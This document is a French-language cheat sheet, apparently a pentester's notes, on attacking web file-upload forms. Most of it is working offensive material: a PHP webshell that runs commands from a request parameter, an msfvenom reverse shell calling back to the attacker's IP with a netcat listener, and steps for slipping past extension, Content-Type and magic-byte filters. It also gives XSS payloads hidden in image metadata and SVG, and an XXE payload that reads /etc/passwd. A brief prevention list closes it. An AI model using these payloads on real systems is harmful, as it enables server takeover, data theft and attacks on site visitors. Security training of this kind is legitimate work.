# File Upload Attack

----

- ###### Étape 1 : Identifier le framework ou l'environnement

- ###### Étape 2 : Uploader le fichier correspondant avec le bon spcript 

- ###### Étape 3 : se rendre sur le lien ou écouter le port de l'application

-----
## Comment Uploader :

##### Quelques scripts ( PHP )

* ###### Avoir le Hostname 
  ```php
    <?php system('hostname'); ?>
  ```
* ######  Creer un webshell custom en php
  ```php
    <?php system($_REQUEST['cmd']); ?>
  ```
  * **Pour communiquer avec le webshell, on utilise :**
    ```
     <www.linkToFile.php>?cmd=<maCommande>
    ```
* ###### Autres webshell en php
  - [phpbash ( bash avec UI )](https://github.com/Arrexel/phpbash)
  - web shells in Seclist ( Seclists/Webshells) 

* ###### Revese Shell
  **Avec msfvenom**
    ```php
    msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
    ```
  **Autres reverse shell php**


  - **Communiquer avec le reverse shell**
    ```bash
     # upload file, then
     nc -lvnp OUR_PORT
     # go to the link of the file in parallel
    ```

  - Payload All The things > Upload Insecure Files 
  - Seclists
-----

### Cas particulier :
  #### Dans le cas d'une image sécurisé :
  ###### Méthode 1 : 
  - **Changer le Content-Type + supprimer toute fonction front de validation**
  ###### Méthode 2 : cas de blacklist  
  * [ ] _sur windows, les extensions de fichier sont insensible à la casse donc on peut bypasser la blacklist avec **pHp** au lieu de **.php**_ 
  
  * [ ] on peut essayer le **fuzzing** de l'extension du fichier lors de l'upload ( burp intruder )  avec le dictionnaire  >> extensions utilisables ou non
    * **Web-extensions de Seclists**
    * **Payload all the things >> upload insecure file**
    * _Steps_ :
      - Aller dans burp suite intruder 
      - Desactiver l'encodage url dans payload
      - charger le dictionnaire ou selectionner un disponible 
      - start Attack
      - regarder les résultats -> fichiers blacklisté / non blacklisté

  ###### Méthode 3 : cas de whitelist
  * [ ] _la whitelist n'autaurise qu'un certain type de fichier, ainsi, on utilise la méthode de la blacklist pour connaître les extensions autorisés_
  - **Pour bypasser la whitelist, on peut utiliser la méthode de la double extension ex : shell.php -> shell.php.png ou shell.php%00.png**
      - payload all the thing upload tricks
      - PayloadsAllTheThings/Upload Insecure Files/Extension PHP
/extensions.lst
      - character injection ( chaque caractère à un contexte précis)

      - **script**
        ```shell
          # script pour generer une wordlist avec des extensions pour bypass whitelist
          for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
            for ext in '.php' '.phps'; do
                echo "shell$char$ext.jpg" >> wordlist.txt
                echo "shell$ext$char.jpg" >> wordlist.txt
                echo "shell.jpg$char$ext" >> wordlist.txt
                echo "shell.jpg$ext$char" >> wordlist.txt
            done
          done
        ```
      - **fuzzing character injection** ( for the get and the post in order to see the the correct file name)

  ###### Méthode 4 : file content validation
  * [ ] _utiliser fuzzing content type avec Seclist worlist content type_
  ###### Méthode 5 : MIME-Type. Multipurpose Internet Mail Extensions (MIME) Validation
  * [ ] _validation à travers le format par byte de la data ( file signature, magic bytes ..)_
      * **Pour le bypass, on peut simuler la signature d'un fichier gif avec GIF8**
      ```bash
        # filename="moncode.php" ...
        GIF8
        <monCode>
      ```
      * **puis utiliser le fuzzing et les autres méthodes combiné pour upload et ensuite get ( burp intruder )**
  ###### Méthode 6 : validation plus sécurisé
  * [ ] _Dans le cas des upload ( HTML, JS, SVG, GIF ): on peut faire une XSS_
    ```bash
      # pour l'image

      exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
      
      # pour l'xml
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
      <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
          <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
          <script type="text/javascript">alert("window.origin");</script>
      </svg>
    ```
  
  * [ ] _Pour un : XML, SVG, PDF, PPT, DOC , une injection XXE est possible_
    ```bash
      # injection xxe
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <svg>&xxe;</svg>
      # [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ] 
      # pour charger index.php
    ```

    * [ ] _Creation d'un programme de DoS (Zip, PNG, JPG) avec XXE, ( zip bomb, pixel flood) ou encore un SSRF ou file transversal attack_

-----
### Autres attaques de file upload :

*  Infection dans le nom du fichier 
*  Upload Directory Disclosure
*  Windows-specific Attacks
*  Advanced file upload Attacks ( bug bounty eports and CVE)

-----
### PREVENTION

* générer des noms de fichier aléatoire
* mettre les fichiers uploadé sur un autre serveur
* creer une blacklist et une whitelist
* content-type validation
* cacher le repertoire / lien pour upload
* limiter la taille des fichiers
* faire des mises à jour
* scan anti malware
* firewall pour web app ( WAF)
* 

-----
## Ressources

###### [Port Swigger Academy](https://portswigger.net/web-security/file-upload)

###### [YesWeHack Blog](https://blog.yeswehack.com/yeswerhackers/file-upload-attacks-part-2/)
  
###### [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)

###### [_synactiv_](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)

###### [_file signature ( magic bytes )_](https://en.wikipedia.org/wiki/List_of_file_signatures)